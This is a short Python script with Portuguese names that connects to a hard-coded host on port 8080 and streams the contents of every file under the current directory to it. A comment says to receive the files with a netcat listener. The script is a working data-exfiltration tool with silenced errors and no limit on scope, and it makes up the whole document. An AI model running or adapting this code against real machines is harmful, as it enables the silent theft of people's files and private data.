import socket
import os

# Iniciar "server" com netcat
HOST = '192.168.1.1'
PORTA = 8080


def enviarArquivo(s, nomeArquivo):
    try:
        with open(nomeArquivo, 'rb') as a:
            data = a.read()
        s.sendall(data)
    except:
        pass


def buscarArquivos(s):
    for diretorioRaiz, diretorios, arquivos in os.walk(os.getcwd()):
        for arquivo in arquivos:
            nomeArquivo = os.path.join(diretorioRaiz, arquivo)
            enviarArquivo(s, nomeArquivo)


def main():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((HOST, PORTA))
    buscarArquivos(s)
    s.close()


if __name__ == '__main__':
    main()
